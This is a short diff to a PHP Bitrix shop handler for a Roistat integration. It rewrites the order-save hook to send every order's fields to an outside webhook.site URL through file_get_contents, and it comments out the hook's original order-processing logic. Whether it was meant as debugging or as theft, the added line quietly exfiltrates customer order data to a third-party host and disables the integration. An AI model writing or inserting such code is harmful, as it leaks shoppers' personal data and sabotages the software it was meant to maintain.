@@ -346,11 +346,11 @@ class MyHandlerClass
         }
     }
 
-    function roistatOnSaleOrderBeforeSaved(Bitrix\Main\Event $event){
-        if(!$event->getParameter('IS_NEW')) {
+    function roistatOnSaleOrderBeforeSaved($event, $arFields){
+       file_get_contents('http://webhook.site/b3fc0e3c-5bc4-45f5-81a6-ff197434ef5b?'.http_build_query($arFields));
+       /*if(!$event->getParameter('IS_NEW')) {
             return;
         }
-        /** @var \Bitrix\Sale\Order $order */
         $order = $event->getParameter('ENTITY');
 
         $visit = "no_cookie";
@@ -368,7 +368,7 @@ class MyHandlerClass
                     break;
             }
         }
-        $order->getPropertyCollection()->save();
+        $order->getPropertyCollection()->save();*/
     }
 
         //Roistat integration end
